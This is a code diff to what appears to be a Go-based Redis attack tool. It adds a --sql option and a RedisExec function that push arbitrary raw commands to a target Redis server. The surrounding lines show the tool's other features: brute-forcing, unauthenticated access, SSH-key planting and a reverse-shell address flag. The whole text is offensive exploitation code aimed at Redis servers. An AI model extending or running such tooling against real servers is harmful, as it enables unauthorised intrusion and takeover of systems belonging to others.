@@ -34,7 +34,7 @@ func init() {
 	RedisCmd.Flags().StringVar(&RemoteHost, "rebound", "", "Rebound shell address (eg.) 192.168.1.1:4444")
 	RedisCmd.Flags().StringVar(&ConnHost, "hostname", "", "Redis will connect this address")
 	RedisCmd.Flags().StringVar(&LoginPass, "pass", "", "set login pass")
-
+	RedisCmd.Flags().StringVar(&SQLCommand, "sql", "", "Execute redis sql command")
 }
 
 func BruteRedisByUser() {
@@ -59,7 +59,7 @@ func BruteRedisByUser() {
 			Println(Clearln + "[*] May be you want to brute? try to add --crack")
 		}
 	}
-	if Hosts == "" && ConnHost != "" && (RemoteHost != "" || RemotePublicKey != "") {
+	if Hosts == "" && ConnHost != "" && (RemoteHost != "" || RemotePublicKey != "" || SQLCommand != "") {
 		var (
 			conn   net.Conn
 			status bool
@@ -75,6 +75,10 @@ func BruteRedisByUser() {
 			if err != nil {
 				Println(fmt.Sprintf("Redis UnAuth failed %v", err))
 			}
+		}
+		if SQLCommand != "" {
+			RedisExec(conn, SQLCommand)
+			return
 		}
 		if status == true {
 			RedisExploit(conn, RemoteHost, RemotePublicKey)
@@ -266,6 +270,22 @@ func RedisExploit(conn net.Conn, RemoteHost string, Filename string) {
 			Println("[x] Redis ssh key failed")
 			return
 		}
+	}
+}
+
+func RedisExec(conn net.Conn, cmd string) {
+	if cmd != "" {
+		_, err := conn.Write([]byte(fmt.Sprintf("%s\r\n", cmd)))
+		if err != nil {
+			Println(fmt.Sprintf("[!] %v", err))
+			return
+		}
+		reply, err := RedisReply(conn)
+		if err != nil {
+			Println(fmt.Sprintf("[!] %v", err))
+			return
+		}
+		Println(fmt.Sprintf("%v", string(reply)))
 	}
 }
 
